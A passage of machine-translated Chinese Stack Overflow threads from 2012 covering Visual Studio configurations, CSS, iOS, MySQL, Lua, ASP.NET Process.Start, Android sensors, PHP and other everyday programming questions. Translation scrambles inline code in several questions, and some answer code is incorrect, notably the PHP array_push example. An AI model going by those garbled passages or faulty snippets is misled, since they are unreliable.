如果我更改引用，这些更改将应用​​于所有配置。我需要每个配置的引用都是单独的。以及其他设置。

我能轻松做到吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:54:28.220

据我所知，VS 中没有对此的用户界面支持，但您可以像这样手动编辑项目文件：

```
<ItemGroup Condition=" '$(Configuration)' == 'DebugForAutoCad' ">
  <Reference Include="somref"/>
  <Reference Include="somotherref />
</ItemGroup>

<PropertyGroup Condition=" '$(Configuration)' == 'DebugForAutoCad' ">
  <OutputPath>somePath<OutputPath/>
</PropertyGroup>

<ItemGroup Condition=" '$(Configuration)' == 'DebugForBricsCAD' ">
  <Reference Include="anohterRef"/>
</ItemGroup>

<PropertyGroup Condition=" '$(Configuration)' == 'DebugForBricsCAD' ">
  <OutputPath>someOtherPath<OutputPath/>
</PropertyGroup> 
```

等等。如果您必须为多个项目执行此操作，我强烈建议将所有常见的内容放在一个单独的文件中，并在每个项目文件中使用`Import`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T03:22:43.710

我建议为每个 AutoCAD 和 Bricscad 目标创建单独的项目，然后简单地在所有项目之间共享源文件。这样，每个项目都有自己的引用，并使用可以在 UI 中轻松管理的标准发布和调试配置。这有点过时了，但我在 2007 年写了一篇关于这个的博客：http: [//otb.manusoft.com/2007/06/visual-studio-build-configuration-tip.htm](http://otb.manusoft.com/2007/06/visual-studio-build-configuration-tip.htm)

# html - 导航下的图像使链接不可点击。

> ID：14074061
> 
> 赞同：0
> 
> 时间：2012-12-28T18:30:53.527
> 
> 标签：html, css

出于某种原因，除非在 Internet Explorer 中，否则这些链接是不可点击的。我尝试给它一个较小的 z-index，我什至仔细检查是否有任何冲突，但我就是无法让它工作。我确定这是因为在导航上，但老实说我不知道​​如何解决这个问题？

我的代码设置如下：

```
 /* Navbar BG Big */
.image {
    position: relative;
    margin-right: auto;
    margin-left: auto;
    height: auto;
    width: 100%; /* for IE 6 */
    background-image: url(../images/headerbg.png);
    background-repeat: repeat-x;
    text-align: center;
}

/* Navbar BG Small */
@media all and (max-width: 1200px) { 
.image {
    background-image: url(../images/spacer.gif);
} 
}

/* Logo Styles */
@media all and (max-width: 800px) { 
#big-logo {
    display: none;
    position: relative;
    z-index: -999;
}
}

@media all and (min-width: 800px) { 
#small-logo {
    display: none;
    position: relative;
    z-index: -998;
}
}

/* Small Nav */
@media all and (max-width: 900px) { 
nav ul {
    list-style-image: none;
    list-style-type: none;
    width: 100%;
    position: absolute;
    margin-bottom: 2em;
}

nav ul li {
    display: inline;
    text-align: center;
    margin-right: .5em;
    margin-left: .5em;
}
}

/* Big Nav */
@media all and (min-width: 900px) { 
nav ul {
    list-style-image: none;
    list-style-type: none;
    width: 100%;
    position: absolute;
    margin-bottom: 2em;
    margin-top: .4em;
}

nav ul li {
    display: inline;
    text-align: center;
    margin-right: 0.5em;
    margin-left: 0.5em;
}
}

.navtext:link, .navtext:visited {
    color: #FFFFFF;
    text-decoration: none;
    font-size: 1em;
    text-shadow: 1px 1px 1px #333;
    font-family: Arial, Helvetica, sans-serif;
    font-weight: bold;
    text-transform: uppercase;
    display: inline-block;
    letter-spacing: 0.2em;
    margin-top: 0.5em;
    margin-bottom: 0.5em;
    padding-right: 2em;
    font-style: normal;
}  

.navtext:hover {
    color: #FFFFFF;
    text-shadow: 1px 1px 2px #00c4ff;
    text-decoration: none;
} 
```

HTML

```
 <!-- logo & nav !-->
<div class="image">

    <nav>
<ul>
    <li><a href="#" class="navtext">Home</a></li>
    <li><a href="#" class="navtext">About</a></li>
    <li><a href="#" class="navtext">Services</a></li>
    <li><a href="#" class="navtext">Portfolio</a></li>
    <li><a href="#" class="navtext">Product</a></li>
    <li><a href="#" class="navtext">Store</a></li>
    <li><a href="#" class="navtext">Support</a></li>
    <li><a href="#" class="navtext">Contact</a></li>        
</ul>
    <ul>
    <li>
<div id="spacer"></div>    
    <!-- big logo !-->
<img src="images/headerlogo.png" alt="ETV Software" id="big-logo" border="0"/>
    </li>
    </ul>
    </nav>

    <!-- navdrop image here !-->
<img src="images/navdrop.png"/>   

    <!-- small logo !--> 
<img src="images/headerlogo.png" alt="Etv Software" id="small-logo" border="0"/> 

</div> 
```

[上面代码的JSFiddle](http://jsfiddle.net/M38ka/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:00:07.960

不要给元素否定，而是`z-index`尝试将`z-index: 1`你`ul`想要的设置在顶部。

[http://jsfiddle.net/M38ka/1/](http://jsfiddle.net/M38ka/1/)

# ios - 在 Storyboard 应用程序中，如何在应用程序期间从 AppDelegate 呈现视图控制器：didFinishLaunchingWithOptions:？

> ID：14074062
> 
> 赞同：0
> 
> 时间：2012-12-28T18:31:05.600
> 
> 标签：ios, uiviewcontroller, uikit, storyboard, uiapplicationdelegate

我有一个 Storyboard 应用程序，它的根视图控制器是`UITableViewController`.

有时当我启动应用程序时，我需要提供一个视图控制器（不需要笔尖或任何东西）。这就是我试图做到这一点的方式：

在我的`UIApplicationDelegate` `application:application didFinishLaunchingWithOptions:`：

```
SplashViewController * splashViewController = [[SplashViewController alloc] init];
splashViewController.semaphore = semaphore;
[self.window.rootViewController presentViewController:splashViewController animated:NO completion:nil]; 
```

问题是，此时它还`UITabBarController`没有在视图层次结构中，所以我收到了这个警告：

```
Warning: Attempt to present <SplashViewController: 0xa786a10> on <UITabBarController: 0xb35d830> whose view is not in the window hierarchy! 
```

将此代码从 AppDelegate 移动到`viewDidLoad`第一个视图控制器的代码`UITableViewController`并不正确，因为我需要在我的 AppDelegate 中创建一些属性，只是为了让我的第一个视图控制器构建该视图。这个逻辑不适合那里。

呈现这个视图控制器的正确方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-07-29T10:06:08.223

在您可以在此处显示视图控制器之前，窗口必须是关键且可见的。您可以通过执行以下操作来完成此操作：

```
[self.window makeKeyAndVisible]; 
```

所以你的完整代码应该是这样的：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    [self.window makeKeyAndVisible];

    SplashViewController * splashViewController = [[SplashViewController alloc] init];
    splashViewController.semaphore = semaphore;
    [self.window.rootViewController presentViewController:viewController animated:NO completion:nil];

    return YES;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T18:54:25.753

一种方法是从你的 rootViewController 到 AppDelegate 的委托回调。

*   在 UITableViewController 中声明一个委托协议，类似于

    ```
    - (void)rootViewHasLoaded; 
    ```

将您的 App Delegate 设置为 UITableViewController 的委托（可以在情节提要中执行此操作）

在 App Delegate 中实现委托方法，并在该方法中放置您的 SplashViewController 代码

```
- (void)rootViewHasLoaded
{
    SplashViewController * splashViewController = [[SplashViewController alloc] init];
    splashViewController.semaphore = semaphore;
    [self.window.rootViewController presentViewController:splashViewController 
                                                 animated:NO 
                                               completion:nil];
} 
```

从您的 rootViewController / UITableViewController 中的适当位置调用委托方法（可能`viewDidLoad`或`viewWillAppear`）

# c# - TFS 单元测试在开发机器上通过但在构建机器上失败

> ID：14074063
> 
> 赞同：8
> 
> 时间：2012-12-28T18:31:06.927
> 
> 标签：c#, asp.net, tfs, tdd, build-automation

我有一些单元测试在开发人员机器上通过，但在 TFS 构建机器上失败。这些测试因不同的原因而失败。我对构建机器的访问权限非常有限。但我可以查看放置文件夹并查看部署了哪些 DLL 文件等。

我还看到 pdb 文件已部署在构建机器上。

**有什么方法可以调试和单步调试代码，说明为什么它只在构建机器上失败？**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T18:41:42.297

> 有什么方法可以调试和单步调试代码，说明为什么它只在构建机器上失败？

是的，您可以附加到构建机器上的进程...但是您必须登录到构建机器并在服务器上运行一个 VS 实例并具有附加到线程的管理员权限...

如果管理员愿意打开服务器进行远程调试，您也可以这样做。但是，由于这会带来更多的安全风险，而不仅仅是让您访问服务器，因此该选项也不可能是可行的。

所以对你来说没有。您将需要查看故障是什么，并找出导致这种情况发生的原因。然后你可以尝试修复它。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-28T18:37:22.620

尝试使用批处理文件运行msbuild，然后您可以在控制台中查看整个过程的进度。这里是一些你的入门代码：

```
ECHO Starting Build 
:: Change to MSBuild Directory
CD C:\Windows\Microsoft.NET\Framework\v4.0.30319
PAUSE
:: READY TO RUN?
ECHO READY TO RUN...
MSBuild.exe "C:\Users\PATH TO YOUR PROJECT HERE\.csproj" /t:MsDeployPublish /p:MsDeployServiceUrl=https://DOMAINHERE.com:8172/msdeploy.axd;DeployIisAppPath="IIS SITE NAME HERE";username=USERNAME;password=PASSWORD;AllowUntrustedCertificate=True;Configuration=Release
:: Outputs tons of network information into the command prompt
ECHO All done.
PAUSE 
```

无论我在哪里用你的设置替换大写......保存.bat文件，双击，你可以在控制台中跟踪所有内容。

# mysql - CSV 在 Where 条件 Mysql 中

> ID：14074064
> 
> 赞同：1
> 
> 时间：2012-12-28T18:31:21.007
> 
> 标签：mysql, select, csv, where

我有两个这样的 MySQL 表：

**表A**

```
 [name]   |   [id]
---------------------
 Shirts      1, 10, 16, 18
 Pants       14, 11
 Skirts      19, 13, 15 
```

**表B**

```
 [id]   |   [s_id]
---------------------
 ABC         1
 AC          1
 DE          10 
 DEC         19
 ACD         16
 BCD         18
 BCO         18 
```

现在我需要从来自任​​何给定名称的匹配中获取`id`s 。`TableB``s_id``id``TableA`

查询将如下所示：

```
 SELECT id 
   FROM TableB
  WHERE s_id IN ( SELECT id
                    FROM TableA
                   WHERE name = 'Shirts' ) 
```

所以子查询返回`1, 10, 16, 18`（csv）。但我知道这不能在子查询中这样使用。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T18:41:22.243

试试这个：

```
SELECT b.id, b.s_id
FROM TableB b 
INNER JOIN TableA a ON FIND_IN_SET(b.s_id, REPLACE(a.id, ' ', ''))
WHERE a.name = 'Shirts'; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T18:48:47.063

你可以试试这个。这个查询需要全表扫描，所以我希望你的表不大。

```
SELECT id
FROM TableB
WHERE FIND_IN_SET(s_id, (SELECT id FROM TableA WHERE name = 'Shirts')) IS NOT NULL 
```

# lua - Lua 读取只读文件

> ID：14074068
> 
> 赞同：3
> 
> 时间：2012-12-28T18:31:58.387
> 
> 标签：lua

这个问题不是关于读取lua文件，而是读取lua中的只读非可执行文件。

我有以下文件

```
10 awesome % ls -l /sys/class/backlight/intel_backlight/actual_brightness                                                                                      
-r--r--r-- 1 root root 4096 Dec 28 20:17 /sys/class/backlight/intel_backlight/actual_brightness 
```

但是当我尝试使用以下代码在 lua 中读取它时，我收到一个错误，即权限被拒绝。有人可以解释一下为什么吗？如何在不更改权限的情况下读取文件？

```
file = io.popen('/sys/class/backlight/intel_backlight/actual_brightness', 'r')
output = file:read('*all')
file:close() 
```

错误消息是（连同在 lua shell 中键入的代码：

```
12 awesome % lua                                                                                                        
Lua 5.2.1  Copyright (C) 1994-2012 Lua.org, PUC-Rio
> file = assert(io.popen('/sys/class/backlight/intel_backlight/actual_brightness', 'r'))
> sh: /sys/class/backlight/intel_backlight/actual_brightness: Permission denied
^C 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T18:39:25.670

如果您打算将其作为文本文件读取，请使用`io.open`而不是。`io.popen`

# c# - asp.net下的Process.Start()？

> ID：14074069
> 
> 赞同：13
> 
> 时间：2012-12-28T18:32:00.273
> 
> 标签：c#, asp.net, iis, iis-7.5, w3wp.exe

根据[msdn](http://msdn.microsoft.com/en-us/library/0w4h05yb.aspx)：

> ASP.NET 网页和服务器控制代码在 Web 服务器上的 ASP.NET 工作进程的上下文中执行。如果您在 ASP.NET 网页或服务器控件中使用 Start 方法，则新进程将在具有**受限权限**的 Web 服务器上执行。该进程不会在与客户端浏览器相同的上下文中启动，并且无权访问用户桌面。

**究竟哪个** *账户*是*“受限权限”*？

例子 ：

*   我登录到win7为`RoyiN`
*   Windows 身份验证已*启用*
*   **在web.config 中***启用*了模拟（整个站点）`BobK`
***   `W3WP`用户是`UserA`（不是网络也不是 ApplicationPoolIdentity）。**

 **在 C# 中我这样做**（**`Process.start("....cmd.exe...")`凭据为：“ ”，“ ”，“ ”） **`Startinfo``Martin``Password``Domain`**

 ***   谁是`account`最终运行的高效者`cmd.exe`？

*   “受限权限”实际上与谁有关？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T19:31:02.600

模拟不会在这里发挥作用，因为在引擎盖下，`Process.Start`它依赖于两个本机 Win32 调用之一：

如果提供了 ProcessStartInfo.UserName：

```
CreateProcessWithLogonW(startInfo.UserName, startInfo.Domain, ...) 
```

[CreateProcessWithLogonW](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682431%28v=vs.85%29.aspx)

如果不：

```
CreateProcess(null, cmdLine, null, null, true, ...) 
```

[创建过程](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425%28v=vs.85%29.aspx)

传递给 CreateProcess的`null`s 可能会咬你；来自 MSDN：

> 该结构的 lpSecurityDescriptor 成员指定主线程的安全描述符。如果 lpThreadAttributes 为 NULL 或 lpSecurityDescriptor 为 NULL，则线程获取默认安全描述符。线程的默认安全描述符中的 ACL 来自进程令牌。

请注意，它表示来自进程令牌，而不是调用线程 - 模拟身份没有机会加入派对，因为它绑定到线程。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-28T19:12:59.007

我相信 MSDN 条目指的是即使启用了模拟并且您处于特定用户上下文中，新进程也将由该进程产生 - 并且模拟发生在线程级别。也就是说，我确实相信它会在“UserA”上下文中运行。

这是相关的 KB 条目：

[http://support.microsoft.com/kb/889251](http://support.microsoft.com/kb/889251)

请注意，同一条目描述了如何使用 CreateProcessAsUser 来允许模拟。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-28T19:19:51.233

正如我在尝试解决[这个问题](https://stackoverflow.com/questions/13482145/git-ssh-hanging-when-called-from-mvc-webapi)时发现的那样，很多小事情都是不同的。它可能在 RoyiN 下运行，但您可能会发现 USERPROFILE 设置为 C:\Windows\system32\config\systemprofile，而不是您的 /Users/RoyiN 文件夹。

根据您要执行的操作，这可能会导致一些问题。就我而言，启动 git 进程将永远挂起。不仅 USERPROFILE 和 HOME 错误，我还发现模拟用户不能很好地使用映射的网络驱动器。****

# android - 如何以指定的速率读取 Android 中的方向传感器数据？

> ID：14074071
> 
> 赞同：1
> 
> 时间：2012-12-28T18:32:15.860
> 
> 标签：android, multithreading, orientation, accelerometer, sensors

我想以指定的速率读取方向传感器值，例如每 100 毫秒。我怎样才能做到这一点以及如何指定 100 ms 的速率？我正在使用以下代码片段来读取方向传感器：

```
 final public SensorEventListener listener=new SensorEventListener() {
   public void onSensorChanged(SensorEvent e) {
    Log.d(TAG, "in sensor changed");

  if (e.sensor.getType()==Sensor.TYPE_ORIENTATION) {
      OrientationX=e.values[0];
      OrientationY=e.values[1];
      OrientationZ=e.values[2];
      message_orientation = "OrientationX ="+String.valueOf(OrientationX)+", OrientationY   ="+String.valueOf(OrientationY)+", OrientationZ ="+String.valueOf(OrientationZ);            
      Log.d(TAG, "Orientation value is "+message_orientation);
  }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T18:47:01.290

从[文档](http://developer.android.com/reference/android/hardware/SensorManager.html)

mSensorManager.registerListener(this, mAccelerometer, SensorManager.SENSOR_DELAY_NORMAL);

SensorManager.SENSOR_DELAY_NORMAL 是速率

正如[文档](http://developer.android.com/reference/android/hardware/SensorManager.html#registerListener%28android.hardware.SensorEventListener,%20android.hardware.Sensor,%20int,%20android.os.Handler%29)所解释的：

速率传感器事件的发送时间为。这只是对系统的提示。事件的接收速度可能比指定的速率快或慢。通常会更快地接收到事件。该值必须是 SENSOR_DELAY_NORMAL、SENSOR_DELAY_UI、SENSOR_DELAY_GAME 或 SENSOR_DELAY_FASTEST 之一。或者，事件之间的所需延迟（以微秒为单位）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-29T21:17:58.617

以下是基于测试结果的一些近似值：

> ```
> Accelerometer, SENSOR_DELAY_FASTEST: 18-20 ms
> Accelerometer, SENSOR_DELAY_GAME: 37-39 ms
> Accelerometer, SENSOR_DELAY_UI: 85-87 ms
> Accelerometer, SENSOR_DELAY_NORMAL: 215-230 ms
> Orientation Sensor, SENSOR_DELAY_FASTEST: 16-17 ms
> Orientation Sensor, SENSOR_DELAY_GAME: 37-39 ms
> Orientation Sensor, SENSOR_DELAY_UI: 77 ms
> Orientation Sensor, SENSOR_DELAY_NORMAL: 224-225 ms 
> ```

您还可以定义自己的速率，例如 100 毫秒。

> int READINGRATE = 100000 %time in us mSensorManager.registerListener(this, mLinearAccelerometer, READINGRATE);

然而，速率只是一个近似值，如果您需要准确的速率，最好使用计时器并每 100 毫秒获取一次值。

# jquery - HTML5 Geolocation 脚本适用于 Chrome，但不适用于 Safari 或任何 iOS6 浏览器

> ID：14074075
> 
> 赞同：3
> 
> 时间：2012-12-28T18:32:24.950
> 
> 标签：jquery, html, ios6, geolocation, handlebars.js

我的 jquery 脚本在 Chrome 中运行良好，但在最新版本的 Safari 和 iOS6 上的所有浏览器中都有问题。系统会提示用户允许在 Safari 中使用地理定位，但其余代码将不会执行。

我知道 iOS6 在地理定位方面存在问题，但不确定这是否是问题所在。任何建议都深表感谢。

```
jQuery(window).ready(function(){  
  $('#circleG')
    .hide()  // hide spinner initially
    .ajaxStart(function() {
        $(this).show();
    })
    .ajaxStop(function() {
        $(this).hide();
    });
            jQuery(window).load(initiate_geolocation);  
        });  
        function initiate_geolocation() {  
            navigator.geolocation.getCurrentPosition(handle_geolocation_query,handle_errors);  
        }  
        function handle_errors(error)  
        {  
            switch(error.code)  
            {  
                case error.PERMISSION_DENIED: 
                break;  
                case error.POSITION_UNAVAILABLE:  
                break;  
                case error.TIMEOUT: 
                break;  
                default: 
                break;  
            }  
        }  

    function handle_geolocation_query(position){
   $.getJSON(BASE+'/yelphome', { latitude: position.coords.latitude, longitude: position.coords.longitude }, function(data) {

   var template = Handlebars.compile($('#template').html());

  $('div.adam').append( template(data.businesses));
 });
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-29T15:32:47.857

W3C 标准如下。我已在许多项目中成功使用它。

```
if(navigator.geolocation != undefined) {

    navigator.geolocation.getCurrentPosition(function(position) {
        var lat = position.coords.latitude,
        lng = position.coords.longitute;

        // DO STUFF HERE
    });
}; 
```

该`navigator.geolocation.getCurrentPosition`功能实际上是提示用户提供他们的位置并随后返回他们的位置信息。

我已经在 Android、iOS、Windows 和 OSX 上成功地测试了这个。

我想你会发现这样的事情会很好地工作：

```
$(window).load(function(){
    if(navigator.geolocation != undefined) {    
        navigator.geolocation.getCurrentPosition(function(position){
            var lat = position.coords.latitude,
            lng = position.coords.longitute;

            // DO STUFF HERE
        }, function(error){
            switch(error.code)  
            {  
                case error.PERMISSION_DENIED: 
                break;  
                case error.POSITION_UNAVAILABLE:  
                break;  
                case error.TIMEOUT: 
                break;  
                default: 
                break;  
            }  
        });
    };
}) 
```

# php - 在 php 中对 ArrayObject 进行排序

> ID：14074076
> 
> 赞同：0
> 
> 时间：2012-12-28T18:32:27.003
> 
> 标签：php, arrays, sorting, object, append

我收到此代码的以下错误 -

> 警告：sort() 期望参数 1 是数组。

```
$array1 = new ArrayObject();

$array1->append("50");
$array1->append("30");
$array1->append("60");

sort($array1); // Should sort to 30, 50, 60. 
```

任何人都可以创建解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T18:36:16.113

`sort()`仅适用于数组。`ArrayObject`是一个对象而不是一个数组。

改用 asort 方法 ( `$array1->asort();`)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T18:35:20.723

### 相反，您需要尝试这种方式：

```
$array1->asort(); 
```

### 查看[`arrayobject.asort`](http://php.net/manual/en/arrayobject.asort.php)更多信息！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T18:38:23.647

您看到此问题是因为您正在尝试对对象进行排序。尽管它的名字`ArrayObject`是一个对象而不是一个数组（参见[手册](http://php.net/manual/en/class.arrayobject.php)）。

您的选择是：

```
$array1 = new ArrayObject();

$array1->append("50");
$array1->append("30");
$array1->append("60");

$array1->asort(); 
```

或者只使用一个数组

```
$array1 = array();

$array1[] = "50";
$array1[] = "30";
$array1[] = "60";

sort($array1); 
```

您实际上是在尝试在对象上使用程序函数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-28T18:40:36.957

如果您希望使用该`sort`函数，则必须将创建数组的方式更改为以下内容：

```
$array1 = array();
$array1 = array_push(array1, "50");
$array1 = array_push(array1, "30");
$array1 = array_push(array1, "60");
sort(array1); 
```

或者更简单：

```
$array1 = array("50","30","60");
sort(array1); 
```

# html - 自定义复选框后的文本不在基线上

> ID：14074078
> 
> 赞同：0
> 
> 时间：2012-12-28T18:33:07.043
> 
> 标签：html, css, input

在以下代码中：

```
<p><input type="checkbox" /> Pavement
<input type="checkbox" /> Dirt or rocky trails
<input type="checkbox"/> Gravel roads</p> 
```

以及以下 CSS：

```
h1, input, button, textarea, progress, p, a, ul, li {
    font-family: "Open Sans", sans-serif;
    font-size: 10pt;
    color: #666;
    letter-spacing: normal;
    text-indent: 0;
    text-shadow: 0 1px 0 hsla(0,0%,100%,.75);
    margin: 10px 2px;
}

input[type="checkbox"], input[type="radio"] {
    background-color: #f4f4f4;
    background-image: -webkit-linear-gradient(90deg, hsla(0,0%,0%,.05), hsla(0,0%,0%,.01));
    box-shadow: inset 0 1px 0 hsla(0,0%,100%,.5),
                0 1px 2px hsla(0,0%,0%,0.5);
    border: none;
    cursor: pointer;
    height: 16px;
    width: 16px;
    position: relative;
    -webkit-appearance: none;
} 
```

复选框似乎几乎是关于其他文本的一行。我尝试删除*所有*CSS 并解决了问题（当我删除所有自定义复选框样式时问题也解决了），但是当我开始逐行删除/替换 CSS 时，我找不到问题。有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:29:25.360

这是你的问题：

```
margin: 10px 2px; 
```

[摆脱它，你就是金子](http://jsfiddle.net/4x59m/)

或者，如果您想将其保留在某些元素上，而不是复选框和单选按钮上，[您可以执行以下操作](http://jsfiddle.net/4x59m/1/)

```
h1, input, button, textarea, progress, p, a, ul, li {
  ...
  margin: 10px 2px;
}
input[type="checkbox"], input[type="radio"] {
  ...
  margin: 0px 2px;
}​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:30:35.220

添加`vertical-align: middle;`到您的复选框应该可以解决它。

IE

```
input[type="checkbox"], input[type="radio"] {
...
   vertical-align: middle;
} 
```

# cocos2d-iphone - 无法停止 cocos2d 中的操作

> ID：14074082
> 
> 赞同：-1
> 
> 时间：2012-12-28T18:33:37.097
> 
> 标签：cocos2d-iphone

我对 a 有一个动作`CCMenu`，它是 a 的孩子`CCLayer`- 他是 a 的孩子`scroller`。（cocos2d的一个滚动层类）

有一个动作正在运行`CCMenu`，它有一个名称和一个标签。

我只是无法阻止它。当我试图达到它时，我看到空值。我努力了：

```
[[[CCDirector sharedDirector].runningScene getChildByTag:600] stopAction:repeat];
[[[[CCDirector sharedDirector].runningScene getChildByTag:600]getChildByTag:800 ]stopAction:repeat];
[[[CCDirector sharedDirector].runningScene getChildByTag:600] stopAllActions];

[self stopAllActions]; 
```

没有什么 。无法阻止那个动作。我怎样才能停止我的所有动作`CCScene`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T21:28:58.083

您可以尝试如下操作：

//1\. 为您的操作分配标签，例如：

```
id action = [CCRotateBy actionWithDuration:10.0f angle:90.0f];
[action setTag:1001]; 
```

运行动作：

```
[menu runAction:action]; 
```

当你想停止它时

```
[menu stopActionByTag: 1001]; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-05-17T10:31:08.467

使用菜单名称代替 ccmenu

ccmenu->stopAllAction();

# c# - 装饰通用注册的子集

> ID：14074086
> 
> 赞同：2
> 
> 时间：2012-12-28T18:33:55.213
> 
> 标签：c#, dependency-injection, simple-injector

我正在为我的 DI 容器使用 SimpleInjector。我有一个带有 2 个类型参数的开放通用接口

```
public interface IAdapter<TRepository, TEntity>
    where TRepository : AbstractRepository
    where TEntity : AbstractModel, new()
{
} 
```

我在容器中注册为：

```
container.RegisterOpenGeneric(typeof(IAdapter<,>), 
    typeof(Adapter<,>)); 
```

我想根据提供的类型来装饰 IAdapter。例如（我知道这段代码无效，但它演示了我正在尝试做的事情）

```
class RepositoryX : AbstractRepository { }
class RepositoryY : AbstractRepository { }
class RepositoryZ : AbstractRepository { }

container.RegisterDecorator(typeof(IAdapter<RepositoryY,>), 
    typeof(SpecificAdapterDecorator<,>));

container.RegisterDecorator(typeof(IAdapter<[RepositoryX|RepositoryZ],>), 
    typeof(GeneralAdapterDecorator<,>)); 
```

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T18:50:56.230

从[通用装饰器文档](http://simpleinjector.codeplex.com/wikipage?title=Advanced-scenarios#Generic_Decorators)中：

> 有一个`RegisterDecorator`可用的重载，允许您提供一个谓词来确定该装饰器是否应该应用于特定的服务类型。使用给定的上下文，您可以确定是否应该应用装饰器。

所以你需要这样的东西：

```
container.RegisterDecorator(
    typeof(IAdapter<,>), 
    typeof(SpecificAdapterDecorator<,>), 
    c => c.ServiceType.GetGenericArguments()[0] == typeof(RepositoryY));

container.RegisterDecorator(
    typeof(IAdapter<,>), 
    typeof(GeneralAdapterDecorator<,>), 
    c => c.ServiceType.GetGenericArguments()[0] != typeof(RepositoryY)); 
```

# java - 从本地服务器数据库到嵌入式数据库

> ID：14074087
> 
> 赞同：0
> 
> 时间：2012-12-28T18:34:00.253
> 
> 标签：java, mysql, database, jdbc

> **可能重复：**
> [Java、MySQL：有没有办法将 MySQL 服务器嵌入 Java 程序？](https://stackoverflow.com/questions/1791417/java-mysql-is-there-a-way-to-embed-a-mysql-server-with-a-java-program)

我制作了一个使用在本地服务器（XAMPP）上工作的mysql数据库的java程序。当我构建我的项目（NETBEANS）时，它只有在本地服务器正在运行时才会起作用。那么有什么方法可以让我的程序在不需要本地服务器的情况下运行。数据库可以嵌入到Jar中吗？文件以使我的应用程序成为独立的。感谢您的帮助！谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T18:37:07.760

对您的问题的简短回答是：不，MySQL 数据库不能“嵌入”到 jar 文件中。

如果您构建的应用程序需要连接到 MySQL 数据库，那么您将需要在某个地方运行 MySQL 数据库服务器。（MySQL 服务器不必是本地的；您可以连接到远程 MySQL 服务器，尽管这会增加依赖性，因此可能不是您想要的“独立”应用程序的方式。

如果您需要“独立”应用程序的“嵌入式”数据库，您可能需要查看一些不同的数据库，例如

Java H2 数据库引擎：[http ://www.h2database.com/html/main.html](http://www.h2database.com/html/main.html)

阿帕奇德比：[http ://db.apache.org/derby/](http://db.apache.org/derby/)

* * *

MySQL 已停止开发和支持 MySQL Connector/MJX [http://dev.mysql.com/doc/connector-mxj/en/connector-mxj.html](http://dev.mysql.com/doc/connector-mxj/en/connector-mxj.html) ，它不是真正的嵌入式数据库；它实际上是一种在请求 JDBC 连接时自动启动 MySQL 实例并初始化数据库的机制。

# mysql - 访问等于值的 SQL 计数字段

> ID：14074088
> 
> 赞同：5
> 
> 时间：2012-12-28T18:34:01.347
> 
> 标签：mysql, sql, ms-access-2007

我正在为客户制作一张表格，他们只希望计算特定的列值我已经完成了一种方法，但它不是他们需要的结果，所以它被放在一边。

我有一张这样的桌子。（注意：不是实际的桌子）

```
company_name | type  | ................
com A        | type1 | ................
com A        | type2 | ................
com B        | type1 | ................
com A        | type2 | ................
com A        | type1 | ................
com C        | type1 | ................
com C        | type2 | ................
com A        | type1 | ................ 
```

依此类推，类型列，尽管其中有一些他们根本不想计算的列

需要的表看起来像这样

```
company_name | Type1 | Type2 | ..........
com A        |   3   |   2   | ..........
com B        |   1   |   0   | ..........
com C        |   1   |   1   | .......... 
```

到目前为止，我得到的是：

```
company_name | Type  | count | ..........
com A        | type1 |   3   | ..........
com A        | type2 |   2   | ..........
com B        | type1 |   1   | ..........
com C        | type1 |   1   | ..........
com C        | type2 |   1   | .......... 
```

请帮助我一直在为此挠头。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T18:36:59.583

试试这个：

```
SELECT
  company_name,
  SUM(IIF(Type = 'type1', 1, 0)) AS Type1,
  SUM(IIF(Type = 'type2', 1, 0)) AS Type2,
  SUM(IIF(Type = 'type3', 1, 0)) AS Type3
FROM table
GROUP BY company_name; 
```

* * *

## 更新

在 MySQL 中，您可以使用[`IF`](http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html#function_if)语句而不是 Access 的`IIF`，也可以在没有`IF`或`CASE`因为 MySQL 隐式转换的情况下编写它：

```
SELECT Promoter, 
  Sum(NoticeType = 'VARIATION')       AS 'Variation', 
  Sum(NoticeType = 'TWO HOURS AFTER') AS 'Two Hours After', 
  Sum(NoticeType = 'THREE MONTHS')    AS 'Three Months', 
  Sum(NoticeType = 'THREE DAY')       AS 'Three Day', 
  Sum(NoticeType = 'TEN DAY')         AS 'Ten Day' 
FROM notices 
GROUP BY Promoter; 
```

# r - Cedergren 数据集在 ubuntu 中下载

> ID：14074090
> 
> 赞同：0
> 
> 时间：2012-12-28T18:34:15.197
> 
> 标签：r, dataset, regression, glm

有没有人在 Ubuntu 中使用过 cedergren 数据集。我有问题，因为我有 Ubuntu 操作系统。它基本上用于逻辑回归

